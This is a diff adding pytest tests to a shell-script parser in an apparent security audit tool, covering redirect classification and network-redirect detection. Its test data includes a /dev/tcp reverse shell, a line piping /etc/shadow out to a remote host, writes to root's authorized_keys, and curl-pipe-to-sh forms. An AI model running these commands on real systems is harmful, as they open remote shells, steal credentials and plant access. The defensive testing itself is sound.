@@ -7,6 +7,8 @@ from romulus.evidence.auditd import execve_argv, parse_record
 from romulus.evidence.normalize import normalize_hits
 from romulus.evidence.shellparse import (
     UnknownShellScript,
+    classify_redirect,
+    network_redirects,
     parse_script,
     shell_script_file_of,
     shell_script_of,
@@ -299,6 +301,101 @@ def test_shell_allowlist_models_literal_quoted_data():
     ]
 
 
+# ------------------------------------------------------------------------------------------------
+# File-descriptor duplications and the `>&`/`&>` forms: previously unparseable, now modelled so a
+# stray `2>&1` no longer makes a whole script unevaluable, and the classic /dev/tcp reverse shell
+# is read as a network redirect.
+# ------------------------------------------------------------------------------------------------
+
+@pytest.mark.parametrize("script,argv,redirects", [
+    ("ls 2>&1", ["ls"], [("2>&", "1")]),
+    ("echo err >&2", ["echo", "err"], [(">&", "2")]),
+    ("cat <& 3", ["cat"], [("<&", "3")]),
+    ("echo hi >&-", ["echo", "hi"], [(">&", "-")]),
+    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ["bash", "-i"],
+     [(">&", "/dev/tcp/10.0.0.1/4444"), ("0>&", "1")]),
+    ("echo key &>> /root/.ssh/authorized_keys", ["echo", "key"],
+     [("&>>", "/root/.ssh/authorized_keys")]),
+    ("echo key &> /root/.ssh/authorized_keys", ["echo", "key"],
+     [("&>", "/root/.ssh/authorized_keys")]),
+    ("echo key >| /root/.ssh/authorized_keys", ["echo", "key"],
+     [(">|", "/root/.ssh/authorized_keys")]),
+    ("cat /etc/shadow > /dev/tcp/1.2.3.4/80 2>&1", ["cat", "/etc/shadow"],
+     [(">", "/dev/tcp/1.2.3.4/80"), ("2>&", "1")]),
+])
+def test_fd_duplication_and_combined_redirects_parse_cleanly(script, argv, redirects):
+    parsed = parse_script(script)
+
+    assert parsed.ok and not parsed.partial
+    assert parsed.commands()[0].argv == argv
+    assert parsed.commands()[0].redirects == redirects
+
+
+@pytest.mark.parametrize("op,target,action,fd,writes,reads,stderr", [
+    (">", "/x", "write", 1, "/x", None, False),
+    (">>", "/x", "append", 1, "/x", None, False),
+    (">|", "/x", "clobber", 1, "/x", None, False),
+    ("<", "/x", "read", 0, None, "/x", False),
+    ("<>", "/x", "readwrite", 0, "/x", "/x", False),
+    ("2>", "/x", "write", 2, "/x", None, False),
+    ("2>&", "1", "dup", 2, None, None, False),          # stderr duplicated from stdout: writes no file
+    ("0>&", "1", "dup", 0, None, None, False),          # stdin duplicated from stdout
+    (">&", "2", "dup", 1, None, None, False),           # `>&2`: a descriptor, not a file
+    (">&", "-", "close", 1, None, None, False),         # close the descriptor
+    (">&", "/dev/tcp/h/p", "write", 1, "/dev/tcp/h/p", None, True),   # `>&FILE`: stdout+stderr to file
+    ("&>", "/x", "write", 1, "/x", None, True),
+    ("&>>", "/x", "append", 1, "/x", None, True),
+    ("<&", "3", "dup", 0, None, None, False),
+])
+def test_classify_redirect_is_typed_not_substring(op, target, action, fd, writes, reads, stderr):
+    r = classify_redirect(op, target)
+    assert (r.action, r.fd, r.writes_file, r.reads_file, r.affects_stderr) == (action, fd, writes, reads, stderr)
+
+
+def test_network_redirects_reads_reverse_shell_and_ignores_plain_fd_dup():
+    out, inbound = network_redirects(parse_script("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
+    assert out == ["/dev/tcp/10.0.0.1/4444"] and inbound == []
+    out, inbound = network_redirects(parse_script("cat < /dev/tcp/10.0.0.9/80"))
+    assert out == [] and inbound == ["/dev/tcp/10.0.0.9/80"]
+    # a bare 2>&1 is a harmless stderr duplication, never a network redirect
+    assert network_redirects(parse_script("id 2>&1")) == ([], [])
+
+
+@pytest.mark.parametrize("script", [
+    "echo x &> /tmp/out", "echo x &>> /tmp/out", "echo x >& /tmp/out",
+])
+def test_bash_only_redirects_are_unevaluable_for_a_posix_sh(script):
+    assert parse_script(script).ok
+    parsed = parse_script(script, "posix")
+    assert parsed.ok is False and "bash-only" in parsed.error
+
+
+def test_posix_sh_still_models_descriptor_duplication():
+    parsed = parse_script("ls 2>&1 >&2", "posix")
+    assert parsed.ok and parsed.commands()[0].redirects == [("2>&", "1"), (">&", "2")]
+
+
+def test_shell_dialect_comes_from_the_kernel_executable():
+    from romulus.evidence.shellparse import shell_dialect
+    assert shell_dialect("/usr/bin/dash") == "posix" and shell_dialect("/bin/sh") == "posix"
+    assert shell_dialect("/usr/bin/bash") == "bash"
+    assert shell_dialect(None, ["sh", "-c", "x"]) == "posix"
+
+
+@pytest.mark.parametrize("script,reason", [
+    ("echo x 2>&/tmp/out", "descriptor-prefixed duplication"),   # N>&WORD with N other than 1
+    ("cat <&/tmp/in", "input duplication"),                      # <&WORD: a bash error
+    ("exec 5<>/dev/tcp/h/p", "command is not modelled"),          # exec builtin: fails closed
+    ("cat <(curl http://e/x)", "process substitution"),
+    ("cat >& ", "redirect target"),                               # dangling duplication target
+])
+def test_still_unmodelled_redirect_families_fail_closed(script, reason):
+    parsed = parse_script(script)
+
+    assert parsed.ok is False
+    assert reason in parsed.error
+
+
 @pytest.mark.parametrize("script,reason", [
     (r"echo $'ansi\\n'", "ANSI-C"),
     ("echo $HOME", "dollar expansion"),
@@ -315,11 +412,6 @@ def test_shell_allowlist_models_literal_quoted_data():
     ("{ curl http://e/x | sh; }", "brace"),
     ("LC_ALL=C curl http://e/x | sh", "assignment prefix"),
     ("cu\\\nrl http://e/x | sh", "line continuation"),
-    ("echo key &>> /root/.ssh/authorized_keys", "redirect"),
-    ("echo key &> /root/.ssh/authorized_keys", "redirect"),
-    ("echo key >& /root/.ssh/authorized_keys", "redirect"),
-    ("cat <& 3", "redirect"),
-    ("echo key >| /root/.ssh/authorized_keys", "redirect"),
     ("echo x\u00a0# ; curl http://e/x | sh", "whitespace"),
     ('echo "$HOME"', "dollar expansion"),
     ('echo "`id`"', "backtick"),
@@ -491,3 +583,12 @@ def test_conflicting_execve_continuation_is_an_error():
     cont = 'type=EXECVE msg=audit(1731940398.711:39824):  a1="b"'
     events, _, errors = normalize_hits([hit("c1", "linux.audit", head), hit("c2", "linux.audit", cont)])
     assert events == [] and errors and "conflicting" in errors[0][1]
+
+
+def test_a_later_unmodelled_redirect_keeps_earlier_complete_lines():
+    parsed = parse_script("echo pwn >> /opt/job.sh\necho done &> /dev/null", "posix")
+    assert parsed.ok is False and parsed.partial is True and "bash-only" in parsed.error
+    assert [c.redirects for c in parsed.commands()] == [[(">>", "/opt/job.sh")]]
+    # an unmodelled redirect on the same line as a command still discards that line
+    same_line = parse_script("echo pwn >> /opt/job.sh; echo done &> /dev/null", "posix")
+    assert same_line.ok is False and same_line.commands() == []
